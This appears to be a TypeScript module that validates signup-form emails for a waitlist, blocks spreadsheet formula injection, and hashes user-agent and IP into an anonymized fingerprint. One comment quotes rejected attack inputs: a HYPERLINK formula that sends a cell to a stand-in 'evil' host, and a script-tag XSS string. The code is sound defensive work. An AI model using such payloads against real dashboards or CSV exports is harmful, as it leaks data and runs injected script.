import { createHash } from "crypto";

// Pure parsing for the early-access signup form, extracted from the waitlist
// route so the validation rules (trim/lowercase, the email shape, the length
// caps) are unit-testable without a Request object or a live Mongo connection.
// Deliberately stricter than "anything without a space or a second @". That
// shape accepted `=HYPERLINK("http://evil/?x="&A1,"c")@x.co`, `a,b,c@x.co` and
// `<script>alert(1)</script>@x.com` — all of which reach the admin dashboard and
// its CSV export. This is the practical subset of RFC 5322 that real addresses
// use; anything outside it is far likelier to be an attack than a customer.
const EMAIL = /^[A-Za-z0-9!#$%&'*+/=?^_`{|}~.-]{1,64}@[A-Za-z0-9]([A-Za-z0-9-]*[A-Za-z0-9])?(\.[A-Za-z0-9]([A-Za-z0-9-]*[A-Za-z0-9])?)+$/;

// A leading =, +, - or @ makes a spreadsheet treat the cell as a formula. The
// character class above still permits them mid-address (legal, e.g. a+tag@x.com),
// so reject them only in first position, where they have no legitimate use.
const FORMULA_LEAD = /^[=+\-@]/;

export type Signup = { email: string; source: string };

export function parseSignup(body: unknown): Signup | { error: string } {
  const b = (body && typeof body === "object" ? body : {}) as Record<string, unknown>;
  const email = String(b.email ?? "").trim().toLowerCase();
  const source = String(b.source ?? "site").slice(0, 40);
  if (!EMAIL.test(email) || email.length > 254 || FORMULA_LEAD.test(email)) {
    return { error: "Enter a valid email address" };
  }
  return { email, source };
}

// Anonymized per-signup fingerprint (never the raw user-agent/IP), so the
// admin dashboard can spot "same browser, many emails" abuse without storing
// anything reversible.
export function uaHash(userAgent: string, ip: string): string {
  return createHash("sha256").update(`${userAgent}|${ip}`).digest("hex").slice(0, 16);
}
